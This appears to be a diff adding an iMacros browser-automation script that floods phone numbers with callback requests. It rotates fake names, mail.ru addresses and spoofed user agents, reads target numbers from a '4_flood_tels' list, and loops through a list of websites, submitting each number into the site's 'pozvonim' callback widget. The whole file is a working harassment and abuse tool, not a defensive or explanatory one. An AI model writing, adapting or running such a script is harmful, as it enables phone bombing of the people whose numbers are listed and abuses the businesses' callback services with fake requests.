@@ -1,0 +1,43 @@
+﻿clear
+set !replayspeed fast
+SET !TIMEOUT_STEP 1 
+set !errorignore yes
+
+
+SET !VAR1 EVAL("var randomNumber=Math.floor(Math.random()*99 + 1); randomNumber;")
+SET !DATASOURCE names4reg.txt
+SET !DATASOURCE_LINE {{!VAR1}}
+set name {{!col1}}
+
+SET !VAR1 EVAL("var randomNumber=Math.floor(Math.random()*99 + 1); randomNumber;")
+set mail {{!var1}}osea@mail.ru
+
+SET !VAR1 EVAL("var randomNumber=Math.floor(Math.random()*99 + 1); randomNumber;")
+SET !DATASOURCE 4_flood_tels.txt
+SET !DATASOURCE_LINE {{!VAR1}}
+set tel {{!col1}}
+  
+SET !VAR1 EVAL("var randomNumber=Math.floor(Math.random()*999 + 1); randomNumber;")
+SET !DATASOURCE 4_flood_sms.txt
+SET !DATASOURCE_LINE {{!VAR1}}
+set sms {{!col1}}
+
+SET !VAR1 EVAL("var randomNumber=Math.floor(Math.random()*99 + 1); randomNumber;")
+SET !DATASOURCE useragents-pc.txt
+SET !DATASOURCE_LINE {{!VAR1}}
+set !USERAGENT {{!col1}}
+
+
+SET !DATASOURCE C:\4flood\pozvonim.txt
+SET !DATASOURCE_LINE {{!LOOP}}
+url goto={{!COL1}}
+set !replayspeed medium
+wait seconds=1
+
+
+TAG POS=1 TYPE=DIV ATTR=CLASS:pozvonim-button-border-outer&&TXT:
+FRAME NAME="callback-frame"
+TAG POS=1 TYPE=INPUT:TEL FORM=NAME:NoFormName ATTR=NAME:phone CONTENT={{tel}}
+TAG POS=1 TYPE=BUTTON FORM=NAME:NoFormName ATTR=NAME:button
+
+ 
